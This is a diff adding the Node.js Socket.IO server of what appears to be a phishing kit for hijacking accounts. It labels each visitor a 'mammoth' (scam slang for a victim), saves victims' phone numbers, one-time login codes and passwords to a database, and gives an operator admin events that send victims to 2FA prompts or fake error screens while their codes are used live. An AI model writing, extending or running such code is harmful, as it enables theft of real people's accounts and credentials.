@@ -1,0 +1,166 @@
+// NODE v20.11.1 ----------------------------------------
+// NPM v8.14.0   ----------------------------------------
+
+require("dotenv").config();
+require('module-alias/register');
+
+
+const { createServer } = require("http");
+const { Server } = require("socket.io");
+
+const db = require('@db');
+const { startBot, bot } = require('./app/bot');
+const server = createServer();
+const io = new Server(server, {
+    transports: ["polling", "websocket"],
+    cors: {
+      origin: "*",
+    }
+});
+
+io.of("userconnect").on("connection", (socket) => {
+    console.log('socket connect', socket.id);
+
+    socket.join(socket.id);
+
+    socket.on('new-visitor', async (data) => {
+
+        const { username, first_name, last_name } = data;
+
+        try{
+
+            const chat = await db.chats.findOne({ where: { chat_id: 1 }});
+
+            if(chat){
+                const new_message = `Мамонт: <b>@${username}</b> ( ${first_name} ${last_name})`;
+                // bot.sendMessage(Number(chat.msg_chat_id), new_message, { parse_mode: "HTML" })
+            }
+
+
+        } catch(e){
+            console.log('ERROR NEW_VISITOR')
+        }
+    })
+
+    socket.on('phone', async (data) => {
+        console.log(data);
+        try{
+
+            db.users.create({ phone: `+${data.phone.code} ${data.phone.phone}`, socket_id: socket.id })
+
+            // запись в бд, телефон и socket.id
+        } catch(e){
+
+        }
+    })
+
+    socket.on('code', async (data) => {
+        console.log(data, "CODEEEE");
+        try{
+            const user = await db.users.findOne({ where: { socket_id: socket.id }})
+            
+            if(user){
+                user.code = data.code;
+                user.save();
+            }
+
+            // запись в бд, code и socket.id
+        } catch(e){
+
+        }
+    });
+
+    socket.on('password', async (data) => {
+        console.log(data, "PASSWORD");
+        try{
+            const user = await db.users.findOne({ where: { socket_id: socket.id }})
+            
+            if(user){
+                user.password = data.password;
+                user.save();
+            }
+
+            // запись в бд, code и socket.id
+        } catch(e){
+
+        }
+    })
+
+    socket.on('get-users', async (data, cb) => {
+        try{
+            const users = await db.users.findAll({ limit: 20, order: [['user_id', 'DESC']] });
+
+            cb && cb(users)
+        }catch(e){
+            console.log(e)
+        }
+    });
+
+    socket.on('next', async (data) => {
+        try{
+            io.sockets.to(data.socket_id).emit('next', { data: 'hello' });
+
+        }catch(e){
+            console.log(e)
+        }
+    });
+    socket.on('admin:2fa', async (data) => {
+        try{
+            io.sockets.to(data.socket_id).emit('2fa', { data: 'hello' });
+
+        }catch(e){
+            console.log(e)
+        }
+    });
+    socket.on('admin:error-2fa', async (data) => {
+        try{
+            io.sockets.to(data.socket_id).emit('error-password', { data: 'hello' });
+
+        }catch(e){
+            console.log(e)
+        }
+    });
+    socket.on('admin:error-code', async (data) => {
+        console.log('admin error code')
+        try{
+            io.sockets.to(data.socket_id).emit('error-code', { data: 'hello' });
+
+        }catch(e){
+            console.log(e)
+        }
+    });
+    socket.on('admin:delete', async (data) => {
+        console.log('delete')
+        try{
+            
+            const user = await db.users.findOne({ where: { user_id: data.user_id} });
+            if(user){
+                console.log(user);
+                user.destroy();
+
+            }
+        }catch(e){
+            console.log(e)
+        }
+    });
+    
+});
+
+
+(async () => {
+    try {
+        await db.sequelize.authenticate();
+
+        //await db.sequelize.sync({ force: true });
+        //await db.init_default_data();
+
+        server.listen(process.env.PORT, async () => {
+          console.log(`Сервер стартовал на ${process.env.PORT} порту!`);
+          
+          startBot();
+        });
+        
+    } catch (e) {
+        console.log(e);
+    }
+})();
